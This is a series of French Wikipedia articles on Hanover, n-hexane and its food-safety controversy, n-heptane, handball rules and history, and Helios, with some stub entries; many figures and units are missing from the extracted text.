Les halles d'exposition, situées au sud de la ville, accueillaient chaque année jusqu'en 2018 le CeBIT, la plus importante foire des technologies de l'information et de la télécommunication du monde. Outre le CeBIT, de nombreuses autres foires ont lieu chaque année sur ce terrain, telles que la foire industrielle « Hannover Messe ».
Jardins royaux d'Herrenhausen.
Cet ensemble comprend plusieurs jardins ainsi qu'un château (reconstruit à l'identique, inauguré en janvier 2013), une orangerie, un théâtre baroque, un labyrinthe, différents rosaires, la grotte de Niki de Saint Phalle et la grande fontaine.
Transport.
L'aéroport international de Hanovre-Langenhagen dessert de nombreuses villes en Europe, et assure également des vols intérieurs vers Francfort et Munich.
La gare centrale de Hanovre ("Hannover Hauptbahnhof") est desservie par des trains ICE, IC/EC qui relie Hanovre au reste de l'Allemagne. Cette gare est aussi desservie par des trains régionaux RE, RB et plus localement le S-Bahn (train de banlieue).
Culture.
Hanovre propose un large choix d'activités culturelles de réputation internationale à ses citoyens et visiteurs grâce à ses nombreux musées, cafés et théâtres.
Religion.
Statistiques religieuses.
Fin 2015 31,1 % de la population de Hanovre se déclarait protestante ("evangelisch") et 13,4 % catholique. La majorité (55,5 %) se déclarait non chrétienne.
Alliance réformée en Allemagne.
Depuis 2006, l'Alliance réformée allemande ("Reformierte Bund in Deutschland e. V."), fédération d'églises d'obédience réformée (donc calvinistes) a son siège à Hanovre. Il était précédemment à Wuppertal.
Médias.
Presse.
Hanovre propose un choix assez large de journaux locaux et régionaux. La maison d'édition de presse "Madsack" édite le "Hannoversche Allgemeine Zeitung", journal régional, et la "Neue Presse", journal local avec un accent sur le sport et la société.
Il existe une édition du "Bild-Zeitung" pour la région de Hanovre.
En outre, de nombreux magazines urbains concernant la vie en ville sont distribués, en partie gratuits, en partie payants. On peut citer "Stadtkind, Schädelspalter, PRINZ Hannover" et "magaScene."
Radio et télévision.
Le "Norddeutscher Rundfunk", organisme de productions pour la radio et la télévision, possède une grande enceinte à Hanovre. Plusieurs émissions régionales y sont produites, mais aussi des émissions pour ARD, première chaîne nationale.
Outre ces institutions publiques, les radios privées et commerciales FFN et Antenne ont leurs maisons et studios à Hanovre.
On trouve des studios régionaux des programmes télévisés ZDF, Sat.1 et RTL.
Il existe une radio « citoyenne » (libre à tous les citoyens qui veulent y participer), qui s'appelle Leinehertz 106einhalb et qui remplace Radio Flora depuis le 17 juin 2009. Cette dernière est devenue une webradio et continue d'émettre exclusivement sur Internet. Une télévision citoyenne existe également, basée sur le même principe, nommée H1.
Universités.
Hanovre propose aux étudiants un choix d'institutions d'enseignement supérieur :
Jumelages.
Il existait un jumelage avec Utrecht (Pays-Bas) entre 1971 et 1976.
Entreprises.
Plusieurs entreprises importantes ont leur siège social à Hanovre : 
Sports.
La ville accueille chaque année les IEM (Intel Extrem Master).
La ville possède de nombreux clubs sportifs : 
La ville dispose de nombreuses enceintes sportives pour pratiquer le football, telles que la HDI-Arena, le Stade Rudolf-Kalweit ou encore le Radrennbahn am Pferdeturm dans le passé (démoli en 1960).

</doc>
<doc id="1428" url="https://fr.wikipedia.org/wiki?curid=1428" title="N-Hexane">
N-Hexane

Le n"-hexane"', ou parfois simplement ', est un hydrocarbure saturé de la famille des alcanes de formule brute CH.
Production.
L'hexane est un produit de la distillation du pétrole ou du gaz naturel.
Usage et mise en garde.
L'hexane est un solvant utilisé en chimie organique (notamment pour les réactions et les extractions).
Il est important de respecter les règles de sécurité concernant ce composé qui est neurotoxique et reprotoxique.
La neurotoxicité se manifeste par la formation d'un métabolite, l', un composé di-carbonylé, qui s'accumule dans le système nerveux central et qui est très toxique. Ce dernier peut être dosé dans les urines pour déceler une éventuelle intoxication.
L'hexane est en conséquence couramment remplacé par le cyclohexane, notamment pour la chromatographie préparative. Si l'usage de l'hexane est préféré, il convient de se protéger efficacement, en particulier grâce à des hottes aspirantes.
137 ouvriers travaillant pour , sous-traitant chinois d'Apple ont été intoxiqués au "n"-hexane en 2009. Quatre en seraient morts.
Scandale sanitaire.
Dès 2014, l'ANSES indique que l'hexane « provoque des atteintes irréversibles du système nerveux périphérique ». L'Institut national de recherche et de sécurité confirme un risque, affirmant qu'une « exposition chronique entraîne des polynévrites périphériques pouvant évoluer vers des paralysies ». En 2024, l'Agence européenne des produits chimiques classe la molécule en « neurotoxique avéré ». En mai 2024, l'EFSA publie un rapport appelant à une réévaluation de la sécurité de l'utilisation de la molécule comme solvant d'extraction dans la production alimentaire. En mai 2025, la Commission européenne chargera l'EFSA de cette réévaluation. 
En octobre 2024, "Libération" publie une enquête sur son usage dans l'alimentaire en France et sur le risque sanitaire grave que cela pourrait présenter. Le journal explique que l'hexane n'est pas un ingrédient alimentaire, mais un « auxiliaire technologique ». Cependant l'ANSES indique que son « utilisation peut avoir pour résultat la présence non intentionnelle, mais techniquement inévitable, de résidus de cette substance ou de ses dérivés dans le produit fini ». Le journal indique que Christian Cravotto, qui travaille sur l'hexane, a rassemblé plusieurs études montrant qu'une molécule issue de la dégradation de l'hexane se retrouve dans les urines humaines, ce qui atteste d'une exposition à l'hexane. Les experts ne savent pas si une faible ingestion répétée d'hexane peut être dangereuse ou non.
En septembre 2025, une enquête de Greenpeace révèle que ce solvant toxique d'origine pétrochimique est couramment utilisé par l'agroindustrie pour extraire des huiles végétales, de matières premières agricoles comme les graines de colza, de soja ou de tournesol. Les tourteaux traités, riches en protéines mais contaminés, sont valorisés comme aliments pour le bétail. C'est ainsi qu'on retrouve des traces d’hexane non seulement dans les huiles de table, mais aussi dans des produits d'origine animale comme le beurre, le lait, y compris maternisé, ou la viande de poulet. 
En septembre 2025, Guillaume Coudray publie "De l'essence dans nos assiettes - Enquête sur un secret bien huilé", qui dénonce la présence de traces de cette molécule dans l'alimentation. "Libération" note que les consommateurs ne peuvent être au courant de la présence d'hexane dans ce qu'ils consomment, car la molécule n'est pas indiquée sur les étiquettes de composition, en raison de son statut d'« auxiliaire technologique ». Le journal indique de plus que Guillaume Coudray a consulté les études scientifiques et interrogé des experts, et en a tiré « un faisceau d’indices graves et souvent concordants, suggérant » qu'il existe un risque à ingérer régulièrement l'hexane même à faible dose. "Le Monde" estime que Guillaume Coudray n'a pu démontrer l'existence d'un scandale sanitaire, mais qu'il a montré que l'industrie alimentaire à adopté l'hexane « par une série d’aveuglements volontaires, ou d’euphémisation des résultats préoccupants » et que ce solvant pourrait être « une cause de l’élévation des risques, pour la population générale, de maladie de Parkinson, de troubles de la fertilité, voire – l’hypothèse est plus spéculative – de sclérose en plaques ».
Le 7 octobre 2025, une trentaine de médecins, chercheurs et acteurs de la santé publient dans "Le Monde" une tribune appelant à une meilleure règlementation voire une interdiction de l'hexane au profit d'alternatives déjà utilisées dans l'agriculture biologique. Le collectif affirme que l'hexane est un « neurotoxique avéré » et perturbateur endocrinien, et il fait valoir que face à « l'épidémie de maladies chroniques » en France, qui représente déjà les deux tiers des remboursements de l'Assurance-maladie, il faut « réduire à la source et dans l'assiette les risques pour la santé publique ».

</doc>
<doc id="1429" url="https://fr.wikipedia.org/wiki?curid=1429" title="N-Heptane">
N-Heptane

L'heptane ou "n"-heptane est l'hydrocarbure saturé de la famille des alcanes linéaires de formule CH.

</doc>
<doc id="1430" url="https://fr.wikipedia.org/wiki?curid=1430" title="Handball">
Handball

Le handball ( (h aspiré), ) est un sport collectif où deux équipes de sept joueurs s'affrontent avec un ballon utilisé à la main en respectant plusieurs règles sur un terrain rectangulaire de dimensions , séparé en deux camps. L'équipe déclarée victorieuse est celle qui a marqué le plus de buts à la fin du temps imparti, soit deux périodes de (ou moins dans les catégories jeunes) voire d'éventuelles prolongations.
Aujourd'hui essentiellement disputé dans un gymnase à sept joueurs (six joueurs de champ et un gardien de but), il existe également des versions en extérieur : le handball à onze, version historique disputée sur gazon à onze joueurs jusque dans les années 1960, et le beach handball, disputé sur sable à quatre joueurs et créé au début du .
Étymologie.
Le nom a été emprunté en 1912 à l'allemand : le substantif allemand se décompose avec " (« la main ») et " (« le ballon »), ce qui signifie littéralement « le ballon à la main », décrivant le ballon de handball lui-même. La prononciation en français européen est influencée par la prononciation allemande d'origine tandis que la prononciation en français canadien est plus proche de la prononciation en anglais nord-américain .
Histoire du handball.
 Le jeu moderne prend ses sources au , au Danemark, sous le nom de . Dans les années 1900, un Irlandais du nom de Casey introduisit un jeu semblable au handball aux États-Unis. Il provoque un tel engouement qu'une compétition aurait même vu le jour en 1919 à Los Angeles. En Tchécoslovaquie, après la fin de la Première Guerre Mondiale prenait naissance le . Cependant, le handball est considéré comme un sport de conception danoise. Le Danois Holger Nielsen créa les premières règles du handball moderne ("håndbold") en 1898. En 1919, le professeur allemand , de l'École normale germanique d'éducation physique de Leipzig, propose une adaptation du "torball" (sorte de pratiqué par les femmes allemandes) : il créa alors le handball à onze. En général, Schelenz est considéré comme le père du handball.
Le jeu se pratique d'abord en extérieur, à 11 contre 11. Le handball à onze est ainsi introduit aux Jeux de Berlin en 1936. En 1938, deux championnats du monde sont organisés en Allemagne et remportés par l'Allemagne : un championnat à onze et un autre à sept, avec quatre équipes européennes (Allemagne, Autriche, Danemark, Suède). Le handball est très peu pratiqué avant la Seconde Guerre mondiale en France, mais en septembre 1941 on assiste à la mise en place, avec l'aide du régime de Vichy, d'une fédération française autonome. De plus, le handball fait son entrée dans les programmes du sport scolaire. La fédération est interdite et dissoute fin 1944 au titre de l'Ordonnance d'Alger du (Statut des groupements sportifs et de jeunesse, Journal officiel de la République française du ). Elle ne pourra renaître, après plusieurs enquêtes administratives et financières, qu'en juillet 1952. La Fédération internationale de handball est quant à elle fondée en 1946.
Dans les années 1960, le handball à onze est progressivement abandonné au profit du handball à sept joueurs et le dernier championnat du monde à 11 a lieu en 1966. Si certaines compétitions ou matchs continuent à être joués en extérieur, le handball investit peu à peu les gymnases. Le handball est admis au programme olympique masculin en 1972 et les femmes entrent en 1976. Le handball est longtemps considéré comme un sport de complément, pratiqué l'hiver au chaud dans les gymnases. Puis, rapidement, on assiste à une véritable progression du handball jusqu'au niveau actuel, notamment grâce aux substrats actifs du milieu scolaire. Le handball doit donc beaucoup aux milieux scolaire et universitaire et tient aujourd'hui encore une place importante dans les programmes de l'Éducation nationale en France.
Principes.
Au handball, le but du jeu est de faire entrer le ballon dans le but adverse plus de fois que son adversaire en utilisant uniquement les mains pour manipuler le ballon. Le principe est de dribbler avec le ballon ou de faire une passe à un coéquipier. Une fois qu'il a le ballon en main, le joueur peut avancer en dribblant mais ne peut effectuer que trois pas sans dribbler et ne peut garder le ballon plus de trois secondes s'il reste immobile.
Généralités.
Une rencontre oppose deux équipes et se déroule généralement en deux mi-temps de , séparées par une pause de . Une équipe comprend jusqu'à et sur l'aire de jeu, ne peuvent se trouver en même temps que , les autres joueurs étant remplaçants. Toutefois, les fédérations internationale (IHF), continentales et nationales ont la possibilité d'alléger la règlementation pour permettre d'inscrire par équipe sur la feuille de match. Le nombre de remplacements en cours de match est illimité.
Une équipe est en temps normal constituée d'un gardien de but et de six joueurs de champ, répartis la plupart du temps en deux ailiers (droit et gauche), deux arrières (droit et gauche), un demi-centre (ou arrière-central) et un pivot (cf. section postes).
Les statistiques montrent qu'entre la fin du et 2003, lors des compétitions internationales le nombre de buts marqués a significativement augmenté. Les matchs enregistrant ou plus par équipe sont de plus en plus fréquents. La compétence des gardiens semblait donc alors grandir moins vite que celle des tireurs.
Terrain.
Aire de jeu.
L'aire de jeu est un rectangle de longueur de et de largeur comprenant une surface de jeu et deux surfaces de but. Les grands côtés sont appelés lignes de touche ; les petits lignes de but (entre les montants) ou lignes de sortie de but. Une zone de sécurité devrait entourer l'aire de jeu. Sa largeur est au moins d'un mètre le long de la ligne de touche et de deux mètres derrière la ligne de sortie de but. Il n'est pas autorisé de modifier les caractéristiques de l'aire de jeu pendant le match de sorte à avantager une seule équipe.
But.
Le but est placé au milieu de chaque ligne de sortie de but. Les buts doivent être solidement fixés au sol ou aux murs derrière eux (s'il y en a). Ils ont une hauteur interne de et une largeur de . Les montants du but sont reliés à une traverse. Leur arête postérieure est alignée sur le côté postérieur de la ligne de but. Les montants et la traverse doivent présenter une section carrée de . Ils doivent être peints sur les trois faces visibles du côté de l'aire de jeu en deux couleurs contrastantes (généralement rouge et blanc), se détachant nettement de l'arrière-plan. Le but doit être muni à l'arrière d'un filet suspendu de telle sorte que le ballon qui entre dans le but ne puisse rebondir ou ressortir immédiatement. Un but est marqué si la balle du tireur passe derrière la ligne du but. Les buts sont situés à chaque extrémité du terrain.
Lignes.
La ligne de but est tracée entre les poteaux d'un but ,elle fait de long. La ligne extérieure ("ligne arrière" ou "ligne de sortie de but") prolonge la ligne de but au fond du terrain, de façon que le but se situe au milieu de la ligne , les deux lignes extérieures délimitent le terrain en longueur (). Les lignes latérales ("lignes de touche") délimitent la largeur du terrain (). La ligne médiane relie les milieux des lignes de touche. Ces lignes sont continues.
Devant chaque but se trouve la surface de but (appelée aussi ). Elle est délimitée par la ligne de surface de but ("ligne des six mètres"), tracée de la façon suivante : une ligne de de long, parallèle à la ligne de but et éloignée de du but, et deux quarts de cercle de de rayon chacun qui relient la ligne de de long à la ligne extérieure.La ligne est continue.
La ligne de limitation du gardien de but ("ligne des quatre mètres") est une ligne de de long tracée parallèlement devant le but, à une distance de . Le gardien peut avancer jusqu'à cette ligne pour se défendre d'un jet de (équivalent du "pénalty" au football), tiré pour l'occasion depuis la ligne de tir ("ligne des sept mètres") : une ligne de de long parallèle à la ligne de but, placée à du but. La ligne de jet franc ("ligne des neuf mètres") est une ligne discontinue, tracée à de la ligne de surface de but, et donc à du but. Les traits de la ligne de jet franc, ainsi que les intervalles, mesurent . La ligne de changement (une partie de la ligne de touche) de chaque équipe s'étend de la ligne médiane à une distance de de celle-ci. L'extrémité de cette ligne de changement est marquée par une ligne parallèle à la ligne médiane. Cette ligne se prolonge de sur l'aire de jeu et de hors de l'aire de jeu (donc seuls ces de part et d'autre de la ligne sont visibles).
Toutes les lignes tracées sur l'aire de jeu font partie intégrante de la surface qu'elles délimitent. Les lignes de but doivent présenter une largeur de entre les montants du but, alors que toutes les autres lignes ont une largeur de .
Les lignes séparant deux zones adjacentes peuvent être remplacées par une différence de couleur entre les zones adjacentes du sol.
Ballon de handball.
Le jeu se pratique avec un ballon sphérique constitué d'une enveloppe de cuir ou de matière synthétique. Les dimensions des ballons, c'est-à-dire la circonférence et le poids, varient selon les différentes catégories d'équipe :
Pendant leur utilisation, les ballons de handball doivent conserver leur poids, leur forme et leur capacité de rebond.
But du jeu.
L'équipe gagnante est celle qui comptabilise le plus de buts à la fin du temps réglementaire (60 minutes). Chaque but s'obtient en faisant pénétrer le ballon dans la cage du but adverse (entre les poteaux et derrière la ligne de but), avec les contraintes principales suivantes :
L'attaquant a donc le droit de sauter au-dessus de la surface de but et effectuer son tir avant de retoucher le sol, afin d'être plus près du but. Les matchs sont généralement dirigés par deux arbitres (à partir du niveau régional) aidés par un chronométreur et un secrétaire. Ces derniers forment la .
Manipulation du ballon.
Au handball, les joueurs de champ jouent le ballon (dont la taille varie selon les différentes catégories d'âges et de sexes) avec les mains. Est considéré comme faute tout ballon touchant intentionnellement une partie du corps inférieure aux genoux. Seul le gardien, lorsqu'il est dans sa zone, a la possibilité de contrer le ballon avec n'importe quelle partie du corps, mais il n'a pas le droit de jouer le ballon au pied. Il est interdit à un de ses équipiers de passer la balle au gardien si ce dernier est encore dans sa zone lorsque le ballon est en jeu, sous peine de "jet franc" aux neuf mètres pour l'adversaire.
Les joueurs peuvent dribbler avec le ballon. La saisie du ballon par les deux mains à la fois stoppe le dribble : le joueur ne peut pas garder la balle dans les mains plus de 3 secondes et doit alors faire au maximum trois pas, tirer ou faire une passe. Si le joueur se remet à dribbler, cela est considéré comme une et la balle est rendue à l'adversaire. Le dribble doit toujours se faire avec la main au-dessus et pas sur le côté par en dessous (comme au basket-ball), cela est considéré comme une .
Lorsqu'une équipe fait tourner la balle sans intention d'attaquer, les deux arbitres lèvent le bras pour demander aux joueurs concernés d'attaquer. Si l'équipe attaquante ne tient pas compte de l'avertissement, et que le ballon recule, le est validé et le ballon rendu aux défenseurs. Si le ballon touche le poteau, est renvoyé par le gardien ou si une sanction est donnée contre la défense, l'avertissement de jeu passif est enlevé. Les arbitres ont aussi la possibilité de siffler un jeu passif sans avertissement lorsqu'ils considèrent que le refus de jeu est flagrant.
Sorties de terrain.
Par une ligne latérale : l'équipe qui a touché le ballon en dernier concède une touche à l'équipe adverse. La remise en jeu s'effectue par un lancer de ballon depuis l'extérieur du terrain, à l'emplacement de la sortie de ballon, par un joueur de cette équipe adverse devant mettre un pied sur la ligne de touche.
Par une ligne arrière : le ballon revient au gardien si c'est un joueur adverse ou le gardien lui-même qui le met derrière la ligne. Si c'est un défenseur qui touche en dernier le ballon, et que le ballon va derrière sa propre ligne de but (en la contrant par exemple), c'est l'équipe adverse qui le récupère par le biais d'un jet de coin (équivalent du au football), sauf si le gardien retouche cette balle en restant dans la zone des .
Durées de jeu.
La durée d'un match dépend de la catégorie d'âge des acteurs de la rencontre, les textes officiels indiquent :
La pause entre deux temps de jeu est normalement de dix minutes cependant pour les compétitions professionnelles, elle est généralement de quinze minutes.
Le chronomètre peut être arrêté à tout moment par les arbitres, par exemple lorsqu'un joueur est blessé ou sanctionné ou lors d'un temps mort. Chaque équipe a droit à un temps mort d'équipe d'une minute au cours de chaque mi-temps du temps de jeu réglementaire. Une équipe peut seulement demander son temps mort d'équipe lorsqu'elle est en possession du ballon. Toutefois, les fédérations internationale (IHF), continentales et nationales ont la possibilité d'alléger la règlementation en autorisant trois temps morts avec un maximum de deux par mi-temps et un maximum dans les cinq dernières minutes du match. 
Sur l'aménagement des règles et des compétitions chez les jeunes, Philippe Bana (alors DTN) rappelle 
Arbitrage.
Au handball, les rencontres sont dirigées par un binôme de deux juges-arbitres, ou par un arbitre jeune en -11 ou -13 ans. Ils sont assistés par deux officiels chargés de tenir la table de marque (un secrétaire et un chronométreur). Dans certaines compétitions nationales et dans toute compétition internationale, par un juge-arbitre délégué de l'instance organisatrice. Les juges-arbitres sont placés de manière à embrasser le jeu de manière globale mais sans en être trop éloignés afin de voir toutes les actions de jeu, régulières et irrégulières, qui sont faites par les joueurs. Chaque juge-arbitre est tour à tour dit "de champ" et "de but" et les deux juges-arbitres échangent régulièrement leur place au cours de la rencontre afin que l'arbitrage ainsi rendu soit le plus équitable et homogène possible.
En France, c'est la Commission centrale d'arbitrage (CCA), commission de la FFHB, qui est chargée de la formation, du suivi, des désignations et du développement du corps arbitral. Cette commission est relayée au niveau des ligues par des Commissions régionales d'arbitrage (CRA) puis, au niveau des comités départementaux, par des commissions départementales d'arbitrage (CDA).
Nouvelles règles de jeu 2016.
À l'occasion des Jeux olympiques 2016, cinq nouvelles règles ont été introduites par la Fédération internationale de handball :
Carton blanc.
Depuis , les arbitres disposent d'un carton blanc en plus des cartons jaune, rouge et bleu pour signaler un joueur qui a été la victime d'une commotion cérébrale. À la suite de son utilisation, un protocole de suivi est mis en place afin de surveiller la santé du joueur concerné.
Postes.
La position des joueurs sur le terrain près du but dépend des tactiques mises en place et leurs rôles ont évolué au cours de l'histoire du handball
En attaque, l'équipe est organisée la majeure partie du temps avec un gardien de but, demi-centre, deux arrières latéraux, deux ailiers et un pivot (les descriptions ci-dessous sont faites en regardant dans le sens de l'attaque et par rapport à la largeur de terrain) :
En fonction des qualités des joueurs et des tactiques mises en place, il peut être possible de changer de poste lors de la mise en place d'une attaque, par exemple lors de croisés entre arrières ou lors de l'entrée d'un ailier en deuxième pivot. De plus, depuis 2016, le gardien de but peut être remplacé par un septième joueur de champ, généralement un deuxième pivot.
En défense, la position dite en est la plus courante : les 6 défenseurs sont alignés autour de la zone afin de contrer les tirs de loin ou de parer les 1 contre 1. La position dite en est également courante : un joueur est en position avancée pour gêner les passes des adversaires ou prendre un adversaire jugé dangereux en défense individuelle stricte et les 5 autres défenseurs sont alignés autour de la zone. D'autres positions existent, plus rares : la (2 joueurs avancés), la (3 joueurs avancés) ou (3 joueurs avancés mais étagés). En principe, les mêmes joueurs évoluent successivement en attaque et en défense, mais certains joueurs se sont spécialisés sur des tâches défensives et ont un rôle offensif inexistant ou très limité. Didier Dinart, Viran Morros, Oliver Roggisch ou encore Raphaëlle Tervel figurent parmi les défenseurs célèbres.
Échelle des sanctions.
Avertissement.
Un joueur ou un officiel de l'équipe peut être sanctionné d'un avertissement en cas de :
Un joueur ne devrait pas recevoir plus d'un avertissement. Une équipe ne devrait pas recevoir plus de trois avertissements. Il ne peut y avoir qu'un avertissement contre l'ensemble des officiels d'une même équipe.
Un joueur qui a déjà été exclu ne devrait plus recevoir d'avertissement.
Exclusion.
Un joueur ou un officiel de l'équipe peut être sanctionné d'une exclusion () en cas de :
Un joueur exclu pour la troisième fois doit être disqualifié. Il ne peut y avoir qu'une exclusion contre l'ensemble des officiels d'une même équipe.
Un joueur exclu doit quitter l'aire de jeu sans être remplacé pendant deux minutes. L'exclusion d'un officiel entraîne la réduction d'un joueur pour l'équipe pendant deux minutes.
Disqualification.
Un joueur ou un officiel de l'équipe peut être sanctionné d'une disqualification en cas de :
Un joueur disqualifié doit quitter l'aire de jeu et la zone de changement jusqu'à la fin de la rencontre mais peut être remplacé après une durée de deux minutes. Un officiel disqualifié doit quitter la zone de changement. La disqualification d'un officiel entraîne la réduction d'un joueur pour l'équipe pendant deux minutes.
Carton bleu.
Depuis les Jeux olympiques 2016, les arbitres disposent d'un carton bleu pour apporter plus de précisions à la disqualification d'un joueur. Lorsque les arbitres montrent ce carton (après avoir brandi un carton rouge), un rapport écrit est à joindre à la feuille de match et la commission disciplinaire est responsable des autres actions à entreprendre.
Temps mort d'équipe.
Chaque équipe peut bénéficier de trois temps morts par partie. Symbolisé par un carton vert numéroté T1, T2 ou T3, il est d'une durée de 1 minute. L'obtention de cette coupure de jeu nécessite d'être en possession du ballon et de déposer son carton vert à la table de marque. La table arrête le chronomètre et désigne aux arbitres l'équipe qui vient de déposer le temps mort. L'utilisation d'un temps mort n'est pas obligatoire. Deux temps morts au maximum peuvent être utilisés lors de chaque mi-temps. Un seul est autorisé par équipe dans les cinq dernières minutes du match.
Entre deux temps morts, d'une équipe, l'adversaire doit avoir été au moins une fois en possession du ballon. À l'issue du temps mort, les équipes reprennent le jeu à l'endroit où il s'est arrêté.
Compétitions.
Principales compétitions internationales des nations.
Mis à part la tentative isolée lors des Jeux olympiques de Berlin en 1936 en handball à onze, le handball moderne (en salle et à sept) fait son entrée au programme olympique en 1972 à Munich, le premier tournoi olympique féminin ayant lieu quatre ans plus tard à Montréal. Auparavant, les championnats du monde à onze puis à sept constituaient les seuls rendez-vous planétaires, bien que peu de pays non-européens aient participé à ces compétitions.
Le handball international étant dominé par les pays européens, son histoire peut être en partie reliée à l'histoire géopolitique de l'Europe. Ainsi, au début des années 1990, la Chute des régimes communistes en Europe, initiée par la chute du Mur de Berlin et achevée par la dislocation de l'URSS, conduit à un déplacement des forces dominantes de l'Est vers l'Ouest. En effet, l'URSS, la Yougoslavie, l'Allemagne (en tant que RFA, RDA ou équipe unifiée), la Tchécoslovaquie ou encore la Roumanie se sont emparés de la majorité des podiums des compétitions des nations et des clubs jusqu'à ce tournant historique.
Depuis lors, si la Russie a assuré l'héritage soviétique dans les années 1990, d'autres pays se sont imposés comme des places fortes du handball mondial, profitant notamment de l'exode de nombreux joueurs soviétiques ou yougoslaves, tel Talant Dujshebaev naturalisé Espagnol en 1996 : l'Allemagne et l'Espagne dominent les coupes d'Europe masculines tandis que chez les femmes, ce sont l'Autriche puis le Danemark qui monopolisent les podiums. Dans les compétitions des nations, ce sont la Norvège chez les femmes et la France chez les hommes qui ont remporté le plus grand nombre de titres.
Seule exception notable à la domination européenne, la Corée du Sud, dont l'équipe féminine est double championne olympique en 1988 et 1992 et championne du monde en 1995 et l'équipe masculine a remporté l'argent olympique en 1988. Parmi les autres nations non-européennes, seuls le Qatar (vice-champion du monde en 2015), la Tunisie et l'Égypte chez les hommes et l'Angola chez les femmes ont eu des résultats probants lors des phases finales des grands tournois internationaux.
Les nations les plus titrées et tenantes du titre lors des principales compétitions internationales et continentales sont :
Principales compétitions internationales des clubs.
Au niveau des clubs, l'épreuve reine est la Ligue des champions, anciennement Coupe d'Europe des clubs champions, qui met aux prises les meilleurs clubs européens depuis 1956 pour les hommes et 1960 pour les femmes. Les autres continents se sont dotés de compétitions similaires, à l'image de la Ligue des champions d'Afrique qui fut créée en 1979.
Principales compétitions nationales.
Chez les hommes, les cinq principaux championnats pour la saison 2025/2026 sont :
En Espagne, Barcelone, vainqueur de sa onzième Ligue des champions en 2022, est le seul club majeur à avoir survécu à la crise économique qui a fortement touché les clubs du championnat et a conduit à la disparition de ces concurrents : Santander (2008), Pampelune (2013), Ciudad Real (2013), Valladolid (2014)... Longtemps dominateur, le handball en Allemagne est porté par les résultats des équipes de Kiel (vingt fois champion) et de Magdebourg ces dernières années ou de Gummersbach, par le passé. Kielce et Płock dominent le championnat de Pologne puisqu'il faut remonter à 2010 pour voir un autre club à l'une des deux premières places. Le Danemark propose également une compétition de haut niveau, mais avec une importante alternance à la tête du championnat, Aalborg et le GOG ayant actuellement les meilleurs résultats. Premier championnat européen en 2018 et 2019, la France profite notamment des performances de Paris, Nantes et Montpellier. En Hongrie, le Veszprém KSE et le SC Pick Szeged dominent outrageusement le championnat puisqu'il faut remonter à 2001 pour voir un autre club à l'une des deux premières places.
Chez les femmes, les cinq principaux championnats pour la saison 2025/2026 sont :
En Hongrie, Győr est l'un des meilleurs clubs européens avec sept Ligues des champions remportées entre 2013 et 2025, même si Ferencváros lui tient la dragée haute sur la scène nationale. En Norvège, le Larvik HK a longtemps dominé le championnat avant d'être détrôné par le Vipers Kristiansand, vainqueur des trois Ligues des champions consécutives. Au Danemark, le Viborg HK et le Slagelse FH ont remporté trois Ligues des champions chacun en sept saisons dans les années 2000, mais ce sont actuellement Odense, Esbjerg et Ikast qui domine la scène nationale. En France, Metz, vainqueur de son en 2025, obtient de bons résultats en coupe d'Europe comme son principal adversaire, Brest. En Roumanie, le CSM Bucarest a pris la succession de Vâlcea au pays et en Europe.
Vocabulaire spécifique.
Le handball possède certains termes spécifiques :
Abréviations.
Une liste non exhaustive des principales abréviations utilisées dans le handball, notamment pour le nom des clubs, est :
Médias.
Les principaux médias spécialisés sur le handball sont :
Voir aussi.
Articles connexes et catégories.
Pratiques et variantes.
D'autres appellations du concernent des sports de longue paume : handball américain, handball frison et handball gaélique.

</doc>
<doc id="1434" url="https://fr.wikipedia.org/wiki?curid=1434" title="Hadès (homonymie)">
Hadès (homonymie)

Mythologie.
Dans la mythologie et la religion grecque antique, ce terme désigne à la fois :

</doc>
<doc id="1435" url="https://fr.wikipedia.org/wiki?curid=1435" title="HIV">
HIV



</doc>
<doc id="1436" url="https://fr.wikipedia.org/wiki?curid=1436" title="Hélios">
Hélios

Dans la mythologie grecque, Hélios (en grec ancien ) est le dieu du Soleil personnifié, souvent représenté avec une couronne rayonnante et chevauchant un char à travers le ciel.
Bien que Hélios fût une divinité relativement mineure dans la Grèce antique, son culte devient plus présent vers la fin de l'Antiquité grâce à son assimilation avec les divinités solaires de la mythologie romaine, notamment Apollon et Sol. L'empereur romain Julien en fait la divinité centrale de la renaissance des anciennes pratiques religieuses qu'il crée au .
Hélios est une figure importante de la poésie et de la littérature de la mythologie grecque, souvent donné comme fils des Titans Hypérion et Théia, et frère des déesses Séléné (la Lune) et Éos (l'Aurore).
Description.
Hélios est souvent représenté comme un jeune homme d'une très grande beauté, couronné d'une auréole solaire, et conduisant le char solaire à travers le ciel chaque jour autour d'Océan tandis qu'il redescend chaque nuit. Dans l"'Hymne homérique à Hélios", il est dit que son char est doré et conduit par des coursiers ; Pindare parle des chevaux d'Hélios comme des . Plus tard encore, ces chevaux reçurent des noms associés au feu : Pyrois (enflammé), Éuos (de l'orient), Éthion (Fougueux rouge) et Phlégon (Soleil couchant ou qui aime la Terre).
L'imagerie autour d'une divinité conduisant un char solaire est plutôt d'origine indo-européenne, et est commune aux religions de la Méditerranée et du Proche-Orient. La représentation artistique la plus ancienne d'un char solaire date de la période parthe, en Perse, où l'on trouve des preuves de rites effectuées par des mages pour le dieu-soleil, créant une assimilation entre le culte de Hélios et celui de Mithra.
Hélios est à la fois vu comme la personnification du Soleil et le pouvoir de création qui en découle, et est donc souvent considéré comme un dieu de vie et de création. Homère décrit Hélios comme un dieu , et d'autres textes antiques lui donnent l'épithète (), étant considéré comme une source de vie et de régénération, et associé avec la création du Monde. Un passage des papyrus grecs magiques dit de Hélios : 
Culte.
Grèce antique.
L. R. Farnell estime que . Les principales sources de cette époque sont biaisées par les Athéniens et, selon John Burnet, . James A. Notopoulos considère la distinction de Burnet comme artificielle : Dans "La Paix", Aristophane le culte de Hélios et Séléné, dieux les plus importants du peuple achéménide, avec celui des douze dieux olympiens ; toutes les preuves montrent que Hélios et Séléné étaient des dieux mineurs pour les Grecs.
L'île de Rhodes était un lieu de culte important pour Hélios, l'un des seuls endroits où il était vénéré comme une divinité majeure en Grèce antique. Le culte de Hélios à Rhodes incluait un rite dans lequel un quadrige, char à deux roues avec un attelage de quatre chevaux de front, était lancé dans un précipice pour atterrir dans la mer, pour représenter le mythe de Phaéton. Des tournois de gymnastique étaient organisés annuellement en l'honneur de Hélios. Le Colosse de Rhodes lui était également dédié. Sur le territoire principal grec, son culte était aussi assez important dans l'Acrocorinthe.
Les Doriens sont également connus pour avoir instauré un culte à Hélios. La diffusion de ce culte à Sicyone, Argos, Hermione, au Sanctuaire d'Asclépios et en Laconie, et la légende selon laquelle son troupeau se trouverait au Cap Ténare, semblent suggérer que la divinité était importante dans la religion dorienne, par rapport à d'autres parties de la Grèce. De plus, il semblerait que ce soit les Doriens qui aient apporté le culte de Hélios à Rhodes.
